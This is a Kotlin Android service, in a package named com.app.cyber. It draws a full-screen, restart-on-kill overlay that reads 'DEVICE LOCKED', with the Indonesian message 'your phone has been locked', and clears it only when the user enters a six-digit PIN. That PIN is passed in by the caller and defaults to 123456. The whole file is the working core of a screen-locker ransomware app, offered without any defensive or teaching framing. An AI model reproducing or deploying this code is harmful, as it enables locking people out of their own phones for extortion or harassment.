package com.app.cyber

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

class LockService : Service() {

    private var view: LinearLayout? = null
    private var expectedPin = "123456"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        expectedPin = intent?.getStringExtra("pin") ?: "123456"
        val msg = intent?.getStringExtra("message") ?: "HP ANDA TELAH DI LOCK"
        
        if (view == null) {
            showOverlay(msg)
        }
        return START_STICKY
    }

    private fun showOverlay(message: String) {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setBackgroundColor(Color.parseColor("#FF1744"))
        layout.gravity = Gravity.CENTER

        val title = TextView(this)
        title.text = "DEVICE LOCKED"
        title.setTextColor(Color.WHITE)
        title.textSize = 24f
        layout.addView(title)

        val sub = TextView(this)
        sub.text = message
        sub.setTextColor(Color.WHITE)
        sub.textSize = 14f
        layout.addView(sub)

        val pinRow = LinearLayout(this)
        pinRow.orientation = LinearLayout.HORIZONTAL
        val digits = mutableListOf<EditText>()
        
        for (i in 0 until 6) {
            val ed = EditText(this)
            ed.width = 80
            ed.height = 100
            ed.gravity = Gravity.CENTER
            ed.setTextColor(Color.WHITE)
            ed.setTextSize(24f)
            pinRow.addView(ed)
            digits.add(ed)
        }
        layout.addView(pinRow)

        val btn = Button(this)
        btn.text = "UNLOCK"
        btn.setOnClickListener {
            val input = digits.map { it.text.toString() }.joinToString("")
            if (input == expectedPin) {
                stopSelf()
            }
        }
        layout.addView(btn)

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        }
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        
        params.gravity = Gravity.TOP or Gravity.LEFT
        view = layout
        wm.addView(layout, params)
    }

    override fun onDestroy() {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            view?.let { wm.removeView(it) }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context, pin: String, msg: String) {
            val intent = Intent(ctx, LockService::class.java)
            intent.putExtra("pin", pin)
            intent.putExtra("message", msg)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        }
        
        fun stop(ctx: Context) {
            ctx.stopService(Intent(ctx, LockService::class.java))
        }
    }
}
